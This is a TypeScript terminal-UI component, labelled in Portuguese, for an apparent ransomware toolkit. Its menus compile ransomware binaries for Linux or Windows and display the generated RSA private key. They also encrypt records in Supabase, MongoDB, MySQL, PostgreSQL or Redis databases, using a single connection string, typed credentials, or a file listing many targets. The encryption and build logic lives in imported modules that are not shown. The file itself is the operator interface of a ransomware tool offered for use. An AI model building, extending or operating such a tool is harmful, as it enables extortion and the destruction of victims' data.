import React from "react";
import { Box, Text, useInput } from "ink";
import { PRIMARY, SECONDARY, FOCUS, UNFOCUS, MUTED, WARNING, ACCENT, DANGER } from "../theme.js";
import { useServices } from "../services/ServicesContext.js";
import { CursorTextInput, CursorInputField } from "./CursorTextInput.js";
import Spinner from "ink-spinner";
import { useWindowState } from "../hooks/windowStore.js";
import type { RansomSO } from "../../src/domain/ports/IRansomCompiler.js";
import type { DbTarget } from "../../src/application/ransom/IRansomController.js";


const EMPTY: CursorInputField = { value: "", pos: 0 };


type Mode =
  | "menu"
  | "so_menu"
  | "database_menu"
  | "db_mode_menu"
  | "db_single_uri"
  | "db_single_fields"
  | "db_file_path"
  | "db_example_path"
  | "running";

type DbInputMode = "single" | "file";

interface RansomWindowProps {
  height: number;
  id: string;
  isFocused?: boolean;
  onBlur?: () => void;
  onClose?: () => void;
}


const MAIN_OPTS      = ["SO", "Database", "Sair"];
const SO_OPTS        = ["Linux", "Windows", "← Voltar"];
const DB_OPTS: DbTarget[] = ["Supabase", "MongoDB", "MySQL", "PostgreSQL", "Redis"];
const DB_BACK        = [...DB_OPTS, "← Voltar"];
const DB_MODE_OPTS   = ["Acesso único", "Acesso de arquivo", "Exemplo de arquivo", "← Voltar"];
const SQL_DBS        = new Set(["PostgreSQL", "MySQL"]);

const DB_ICON: Record<string, string> = {
  Supabase:   "⚡ ",
  MongoDB:    "☘ ",
  MySQL:      "◈ ",
  PostgreSQL: "⧖ ",
  Redis:      "⬡ ",
};


export const RansomWindow: React.FC<RansomWindowProps> = ({
  height,
  id,
  isFocused = false,
  onBlur,
  onClose,
}) => {
  const { ransomController } = useServices();


  const [isRunning,    setIsRunning]    = useWindowState(id, "isRunning",    false);
  const [logs,         setLogs]         = useWindowState<string[]>(id, "logs", []);
  const [menuIndex,    setMenuIndex]    = useWindowState(id, "menuIndex",    0);
  const [mode,         setMode]         = useWindowState<Mode>(id, "mode",   "menu");
  const [soIndex,      setSoIndex]      = useWindowState(id, "soIndex",      0);
  const [dbIndex,      setDbIndex]      = useWindowState(id, "dbIndex",      0);
  const [dbModeIndex,  setDbModeIndex]  = useWindowState(id, "dbModeIndex",  0);
  const [dbTarget,     setDbTarget]     = useWindowState<DbTarget | "">(id, "dbTarget", "");
  const [targetLabel,  setTargetLabel]  = useWindowState(id, "targetLabel",  "");
  const [binaryPath,   setBinaryPath]   = useWindowState(id, "binaryPath",   "");
  const [privKeyPem,   setPrivKeyPem]   = useWindowState(id, "privKeyPem",   "");
  const [runningOp,    setRunningOp]    = useWindowState<"compile" | "encrypt">(id, "runningOp", "compile");


  const [linuxKey,      setLinuxKey]      = useWindowState<CursorInputField>(id, "linuxKey",      EMPTY);
  const [winKey,        setWinKey]        = useWindowState<CursorInputField>(id, "winKey",        EMPTY);
  const [dbUriField,    setDbUriField]    = useWindowState<CursorInputField>(id, "dbUriField",    EMPTY);
  const [dbFileField,   setDbFileField]   = useWindowState<CursorInputField>(id, "dbFileField",   EMPTY);
  const [dbExampleField,setDbExampleField]= useWindowState<CursorInputField>(id, "dbExampleField",EMPTY);


  const [dbHostField,   setDbHostField]   = useWindowState<CursorInputField>(id, "dbHostField",   EMPTY);
  const [dbPortField,   setDbPortField]   = useWindowState<CursorInputField>(id, "dbPortField",   EMPTY);
  const [dbUserField,   setDbUserField]   = useWindowState<CursorInputField>(id, "dbUserField",   EMPTY);
  const [dbPassField,   setDbPassField]   = useWindowState<CursorInputField>(id, "dbPassField",   EMPTY);
  const [dbDbNameField, setDbDbNameField] = useWindowState<CursorInputField>(id, "dbDbNameField", EMPTY);
  const [activeDbField, setActiveDbField] = useWindowState(id, "activeDbField", 0);

  const appendLog = (msg: string) => setLogs((prev) => [...prev, msg]);


  const resetSqlFields = () => {
    setDbHostField(EMPTY); setDbPortField(EMPTY); setDbUserField(EMPTY);
    setDbPassField(EMPTY); setDbDbNameField(EMPTY); setActiveDbField(0);
  };


  const runEncryptDb = async (db: DbTarget, inputMode: DbInputMode, source: string) => {
    setMode("running");
    setRunningOp("encrypt");
    setIsRunning(true);
    setLogs([]);
    setBinaryPath("");
    setTargetLabel(db);

    try {
      const result = await ransomController.encryptDb(db, inputMode, source, appendLog);

      if (result.isSuccess) {
        appendLog(`[+] ${result.value!.encrypted} registros criptografados em ${db}`);
      } else {
        appendLog(`[ERROR] ${result.error}`);
      }
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      appendLog(`[ERROR] ${msg}`);
    }
    setIsRunning(false);
    setMode("menu");
  };

  const runGenerateExample = async (db: DbTarget, outputPath: string) => {
    setMode("running");
    setRunningOp("encrypt");
    setIsRunning(true);
    setLogs([]);
    setTargetLabel(db);

    try {
      const result = await ransomController.generateExample(db, outputPath);

      if (result.isSuccess) {
        appendLog(`[+] Exemplo gerado: ${result.value!.filePath}`);
      } else {
        appendLog(`[ERROR] ${result.error}`);
      }
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      appendLog(`[ERROR] ${msg}`);
    }
    setIsRunning(false);
    setMode("menu");
  };

  const runCompile = async (so: RansomSO) => {
    setMode("running");
    setRunningOp("compile");
    setIsRunning(true);
    setLogs([]);
    setBinaryPath("");
    setPrivKeyPem("");

    try {
      const result = await ransomController.compile(so, appendLog);

      if (result.isSuccess) {
        setBinaryPath(result.value!.binaryPath);
        setPrivKeyPem(result.value!.privKeyPem);
      } else {
        appendLog(`[ERROR] ${result.error}`);
      }
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      appendLog(`[ERROR] ${msg}`);
    }
    setIsRunning(false);
    setMode("menu");
  };


  useInput((input, key) => {
    if (isRunning) return;

    if (key.escape) {
      if (mode === "menu")             { onBlur?.();                               return; }
      if (mode === "so_menu")          { setMode("menu");        setSoIndex(0);    return; }
      if (mode === "database_menu")    { setMode("menu");        setDbIndex(0);    return; }
      if (mode === "db_mode_menu")     { setMode("database_menu");                 return; }
      if (mode === "db_single_uri")    { setMode("db_mode_menu");                  return; }
      if (mode === "db_single_fields") { setMode("db_mode_menu");                  return; }
      if (mode === "db_file_path")     { setMode("db_mode_menu");                  return; }
      if (mode === "db_example_path")  { setMode("db_mode_menu");                  return; }
      setMode("menu");
      return;
    }


    if (mode === "menu") {
      if (key.upArrow)   { setMenuIndex((i) => Math.max(0, i - 1));                    return; }
      if (key.downArrow) { setMenuIndex((i) => Math.min(MAIN_OPTS.length - 1, i + 1)); return; }
      if (key.return) {
        const sel = MAIN_OPTS[menuIndex];
        if (sel === "SO")       { setMode("so_menu");       setSoIndex(0);   return; }
        if (sel === "Database") { setMode("database_menu"); setDbIndex(0);   return; }
        if (sel === "Sair")     { onClose?.();                               return; }
      }
      return;
    }


    if (mode === "so_menu") {
      if (key.upArrow)   { setSoIndex((i) => Math.max(0, i - 1));                  return; }
      if (key.downArrow) { setSoIndex((i) => Math.min(SO_OPTS.length - 1, i + 1)); return; }
      if (key.return) {
        const sel = SO_OPTS[soIndex];
        if (sel === "Linux")     { setTargetLabel("Linux");   runCompile("linux");   return; }
        if (sel === "Windows")   { setTargetLabel("Windows"); runCompile("windows"); return; }
        if (sel === "← Voltar") { setMode("menu");                                  return; }
      }
      return;
    }


    if (mode === "database_menu") {
      if (key.upArrow)   { setDbIndex((i) => Math.max(0, i - 1));                   return; }
      if (key.downArrow) { setDbIndex((i) => Math.min(DB_BACK.length - 1, i + 1));  return; }
      if (key.return) {
        const sel = DB_BACK[dbIndex];
        if (sel === "← Voltar") { setMode("menu"); return; }
        setDbTarget(sel as DbTarget);
        setDbModeIndex(0);
        setMode("db_mode_menu");
        return;
      }
      return;
    }


    if (mode === "db_mode_menu") {
      if (key.upArrow)   { setDbModeIndex((i) => Math.max(0, i - 1));                      return; }
      if (key.downArrow) { setDbModeIndex((i) => Math.min(DB_MODE_OPTS.length - 1, i + 1)); return; }
      if (key.return) {
        const sel = DB_MODE_OPTS[dbModeIndex];
        if (sel === "Acesso único") {
          if (SQL_DBS.has(dbTarget as string)) {
            resetSqlFields();
            setMode("db_single_fields");
          } else {
            setDbUriField(EMPTY);
            setMode("db_single_uri");
          }
          return;
        }
        if (sel === "Acesso de arquivo") { setDbFileField(EMPTY); setMode("db_file_path");  return; }
        if (sel === "Exemplo de arquivo") {
          const defaultPath = `./exemplo_${(dbTarget ?? "db").toLowerCase()}.txt`;
          setDbExampleField({ value: defaultPath, pos: defaultPath.length });
          setMode("db_example_path");
          return;
        }
        if (sel === "← Voltar") { setMode("database_menu"); return; }
      }
      return;
    }


    if (mode === "db_single_uri") {
      if (key.return) {
        const uri = dbUriField.value.trim();
        if (!uri) { appendLog("[!] URI obrigatória"); return; }
        runEncryptDb(dbTarget as DbTarget, "single", uri);
        return;
      }
      return;
    }


    if (mode === "db_single_fields") {
      if (key.return) {
        if (activeDbField < 4) {
          setActiveDbField((i) => i + 1);
        } else {
          const parts = [
            dbHostField.value, dbPortField.value, dbUserField.value,
            dbPassField.value, dbDbNameField.value,
          ];
          if (parts.some((p) => !p.trim())) {
            appendLog("[!] Preencha todos os campos"); return;
          }
          runEncryptDb(dbTarget as DbTarget, "single", parts.join("|"));
        }
        return;
      }
      return;
    }


    if (mode === "db_file_path") {
      if (key.return) {
        const filePath = dbFileField.value.trim();
        if (!filePath) { appendLog("[!] Caminho do arquivo obrigatório"); return; }
        runEncryptDb(dbTarget as DbTarget, "file", filePath);
        return;
      }
      return;
    }


    if (mode === "db_example_path") {
      if (key.return) {
        const outPath = dbExampleField.value.trim();
        if (!outPath) { appendLog("[!] Caminho obrigatório"); return; }
        runGenerateExample(dbTarget as DbTarget, outPath);
        return;
      }
      return;
    }

  }, { isActive: isFocused });


  const displayLogs = logs.slice(-Math.max(4, Math.floor(height - 14)));

  const modeLabel: Record<Mode, string> = {
    menu:              "RANSOM",
    so_menu:           "RANSOM › SO",
    database_menu:     "RANSOM › DATABASE",
    db_mode_menu:      `RANSOM › ${dbTarget || "DB"} › MODO`,
    db_single_uri:     `RANSOM › ${dbTarget || "DB"} › ÚNICO`,
    db_single_fields:  `RANSOM › ${dbTarget || "DB"} › ÚNICO`,
    db_file_path:      `RANSOM › ${dbTarget || "DB"} › ARQUIVO`,
    db_example_path:   `RANSOM › ${dbTarget || "DB"} › EXEMPLO`,
    running:           runningOp === "encrypt" ? "RANSOM › CRIPTOGRAFANDO" : "RANSOM › COMPILANDO",
  };

  return (
    <Box
      borderStyle={isFocused ? "double" : "round"}
      borderColor={isFocused ? DANGER : UNFOCUS}
      flexDirection="column"
      flexGrow={1}
      flexShrink={1}
      height={height}
      paddingX={1}
      paddingY={0}
      overflow="hidden"
    >
      {}
      <Box flexDirection="row" gap={1}>
        <Text color={isFocused ? DANGER : UNFOCUS} bold>
          {isRunning
            ? <><Spinner /> {modeLabel[mode]}</>
            : `☠  ${modeLabel[mode]}`}
        </Text>
        {isFocused && <Text color={DANGER} bold>{"[FOCUSED]"}</Text>}
      </Box>

      {}
      {mode === "menu" && (
        <Box flexDirection="column" marginBottom={1}>
          {MAIN_OPTS.map((opt, i) => {
            const sel  = i === menuIndex;
            const icon = opt === "SO" ? "⊞ " : opt === "Database" ? "⛁ " : "× ";
            return (
              <Text key={opt} color={sel ? DANGER : MUTED} bold={sel}>
                {`${sel ? "→" : " "} ${icon}${opt}`}
              </Text>
            );
          })}
          <Text color={UNFOCUS} dimColor>
            {isFocused ? "↑/↓ · Enter · Esc → desfoca" : "[Tab → focar]"}
          </Text>
        </Box>
      )}

      {}
      {mode === "so_menu" && (
        <Box flexDirection="column" marginBottom={1}>
          <Text color={SECONDARY} bold>{"Selecione o Sistema Operacional:"}</Text>
          {SO_OPTS.map((opt, i) => {
            const sel  = i === soIndex;
            const icon = opt === "Linux" ? "🐧 " : opt === "Windows" ? "🪟 " : "   ";
            return (
              <Text key={opt} color={sel ? DANGER : (opt === "← Voltar" ? UNFOCUS : MUTED)} bold={sel}>
                {`${sel ? "→" : " "} ${icon}${opt}`}
              </Text>
            );
          })}
          <Text color={UNFOCUS} dimColor>{"↑/↓ · Enter · Esc → voltar"}</Text>
        </Box>
      )}

      {}
      {mode === "database_menu" && (
        <Box flexDirection="column" marginBottom={1}>
          <Text color={SECONDARY} bold>{"Selecione o Banco de Dados:"}</Text>
          {DB_BACK.map((opt, i) => {
            const sel  = i === dbIndex;
            const icon = DB_ICON[opt] ?? "   ";
            return (
              <Text key={opt} color={sel ? ACCENT : (opt === "← Voltar" ? UNFOCUS : MUTED)} bold={sel}>
                {`${sel ? "→" : " "} ${icon}${opt}`}
              </Text>
            );
          })}
          <Text color={UNFOCUS} dimColor>{"↑/↓ · Enter · Esc → voltar"}</Text>
        </Box>
      )}

      {}
      {mode === "db_mode_menu" && (
        <Box flexDirection="column" marginBottom={1}>
          <Text color={SECONDARY} bold>{`${DB_ICON[dbTarget] ?? ""}${dbTarget} — Modo de acesso:`}</Text>
          {DB_MODE_OPTS.map((opt, i) => {
            const sel  = i === dbModeIndex;
            const icon = opt === "Acesso único" ? "⊡ " : opt === "Acesso de arquivo" ? "≡ " : opt === "Exemplo de arquivo" ? "✎ " : "   ";
            return (
              <Text key={opt} color={sel ? ACCENT : (opt === "← Voltar" ? UNFOCUS : MUTED)} bold={sel}>
                {`${sel ? "→" : " "} ${icon}${opt}`}
              </Text>
            );
          })}
          <Text color={UNFOCUS} dimColor>{"↑/↓ · Enter · Esc → voltar"}</Text>
        </Box>
      )}

      {}
      {mode === "db_single_uri" && (
        <Box flexDirection="column">
          <Text color={DANGER} bold>{`${DB_ICON[dbTarget] ?? ""}${dbTarget} — Acesso único`}</Text>
          <Text color={MUTED} dimColor>{"ex: mongodb://user:pass@host:27017/banco"}</Text>
          <Text color={PRIMARY}>{"uri:"}</Text>
          <CursorTextInput
            field={dbUriField}
            setField={setDbUriField}
            isActive={isFocused}
            color={FOCUS}
          />
          <Text color={UNFOCUS} dimColor>{"Enter → CRIPTOGRAFAR  ·  Esc → voltar"}</Text>
        </Box>
      )}

      {}
      {mode === "db_single_fields" && (
        <Box flexDirection="column">
          <Text color={DANGER} bold>{`${DB_ICON[dbTarget] ?? ""}${dbTarget} — Acesso único`}</Text>
          <Box flexDirection="row" gap={1}>
            <Text color={activeDbField === 0 ? PRIMARY : MUTED}>{"host:    "}</Text>
            <CursorTextInput field={dbHostField}   setField={setDbHostField}   isActive={isFocused && activeDbField === 0} color={FOCUS} />
          </Box>
          <Box flexDirection="row" gap={1}>
            <Text color={activeDbField === 1 ? PRIMARY : MUTED}>{"porta:   "}</Text>
            <CursorTextInput field={dbPortField}   setField={setDbPortField}   isActive={isFocused && activeDbField === 1} color={FOCUS} />
          </Box>
          <Box flexDirection="row" gap={1}>
            <Text color={activeDbField === 2 ? PRIMARY : MUTED}>{"usuário: "}</Text>
            <CursorTextInput field={dbUserField}   setField={setDbUserField}   isActive={isFocused && activeDbField === 2} color={FOCUS} />
          </Box>
          <Box flexDirection="row" gap={1}>
            <Text color={activeDbField === 3 ? PRIMARY : MUTED}>{"senha:   "}</Text>
            <CursorTextInput field={dbPassField}   setField={setDbPassField}   isActive={isFocused && activeDbField === 3} color={FOCUS} />
          </Box>
          <Box flexDirection="row" gap={1}>
            <Text color={activeDbField === 4 ? PRIMARY : MUTED}>{"banco:   "}</Text>
            <CursorTextInput field={dbDbNameField} setField={setDbDbNameField} isActive={isFocused && activeDbField === 4} color={FOCUS} />
          </Box>
          <Text color={UNFOCUS} dimColor>{"Enter → próximo campo  ·  último Enter → CRIPTOGRAFAR  ·  Esc → voltar"}</Text>
        </Box>
      )}

      {}
      {mode === "db_file_path" && (
        <Box flexDirection="column">
          <Text color={DANGER} bold>{`${DB_ICON[dbTarget] ?? ""}${dbTarget} — Acesso de arquivo`}</Text>
          <Text color={MUTED} dimColor>{
            SQL_DBS.has(dbTarget as string)
              ? "host|porta|usuario|senha|banco  (1 por linha)"
              : "uma URI por linha"
          }</Text>
          <Text color={PRIMARY}>{"arquivo:"}</Text>
          <CursorTextInput
            field={dbFileField}
            setField={setDbFileField}
            isActive={isFocused}
            color={FOCUS}
          />
          <Text color={UNFOCUS} dimColor>{"Enter → CRIPTOGRAFAR  ·  Esc → voltar"}</Text>
        </Box>
      )}

      {}
      {mode === "db_example_path" && (
        <Box flexDirection="column">
          <Text color={ACCENT} bold>{`${DB_ICON[dbTarget] ?? ""}${dbTarget} — Gerar exemplo`}</Text>
          <Text color={MUTED} dimColor>{"Gera um .txt modelo para você preencher e usar em Acesso de arquivo."}</Text>
          <Text color={PRIMARY}>{"salvar em:"}</Text>
          <CursorTextInput
            field={dbExampleField}
            setField={setDbExampleField}
            isActive={isFocused}
            color={FOCUS}
          />
          <Text color={UNFOCUS} dimColor>{"Enter → GERAR  ·  Esc → voltar"}</Text>
        </Box>
      )}

      {}
      {mode === "running" && (
        <Box flexDirection="column">
          <Text color={WARNING} bold>
            {isRunning
              ? <><Spinner /> {runningOp === "encrypt"
                  ? `Criptografando ${targetLabel}...`
                  : `Docker compilando ${targetLabel}...`}</>
              : runningOp === "encrypt" ? "Criptografia concluída" : "Compilação concluída"}
          </Text>
        </Box>
      )}

      {}
      <Box flexDirection="column" flexGrow={1} overflow="hidden" marginTop={1}>
        {displayLogs.map((log, i) => {
          const color = log.startsWith("[!]")     ? WARNING
                      : log.startsWith("[ERROR]") ? DANGER
                      : log.startsWith("[+]")     ? ACCENT
                      : log.startsWith("[*]")     ? FOCUS
                      : MUTED;
          return (
            <Text key={i} wrap="truncate" color={color}>{log}</Text>
          );
        })}
      </Box>

      {}
      <Box flexDirection="column" marginTop={0}>
        {binaryPath && (
          <Text color={ACCENT} wrap="truncate">{`Binário: ${binaryPath}`}</Text>
        )}
        {privKeyPem && (
          <Box flexDirection="column">
            <Text color={WARNING} bold>{"[!] CHAVE PRIVADA RSA-2048 — guarde com segurança:"}</Text>
            {privKeyPem.split("\n").slice(0, 4).map((line, i) => (
              <Text key={i} color={DANGER} wrap="truncate">{line}</Text>
            ))}
            <Text color={MUTED} dimColor>{`  ... salva em: ${binaryPath.replace(/[^/\\]+$/, "private_key.pem")}`}</Text>
          </Box>
        )}
        {!binaryPath && !privKeyPem && (
          <Text color={UNFOCUS} dimColor>
            {targetLabel ? `Alvo: ${targetLabel}` : "Par RSA gerado automaticamente no build"}
          </Text>
        )}
      </Box>
    </Box>
  );
};

